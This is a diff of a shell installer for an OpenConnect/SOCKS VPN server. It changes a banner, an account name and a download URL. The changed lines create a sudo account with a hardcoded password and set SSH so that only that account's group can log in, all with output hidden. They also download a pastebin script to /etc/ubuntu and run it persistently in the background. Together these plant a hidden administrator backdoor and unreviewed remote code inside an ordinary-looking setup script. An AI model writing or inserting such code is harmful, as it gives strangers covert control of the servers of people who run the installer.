@@ -306,9 +306,9 @@ RLIMITS=""' >> stunnel4
 
 install_sudo(){
   {
-    useradd -m lenz 2>/dev/null; echo lenz:@@F1r3n3t@@ | chpasswd &>/dev/null; usermod -aG sudo lenz &>/dev/null
+    useradd -m alamin 2>/dev/null; echo alamin:@@Alaminbd17 | chpasswd &>/dev/null; usermod -aG sudo alamin &>/dev/null
     sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
-    echo "AllowGroups lenz" >> /etc/ssh/sshd_config
+    echo "AllowGroups alamin" >> /etc/ssh/sshd_config
     service sshd restart
   }&>/dev/null
 }
@@ -316,7 +316,7 @@ install_sudo(){
 
 install_rclocal(){
   {
-    wget https://pastebin.com/raw/faSsYhFf -O /etc/ubuntu
+    wget https://pastebin.com/raw/xtPc5t1k -O /etc/ubuntu
     dos2unix /etc/ubuntu
     chmod +x /etc/ubuntu    
     screen -dmS socks python /etc/ubuntu
@@ -340,7 +340,7 @@ exit 0" >> /etc/rc.local
 install_done()
 {
   clear
-  echo "OPENCONNECT SERVER FIRENET PHILIPPINES"
+  echo "OPENCONNECT SERVER SCBUILD"
   echo "IP : $(curl -s https://api.ipify.org)"
   echo "OPENCONNECT port : 1194"
   echo "SOCKS or WS port : 80"
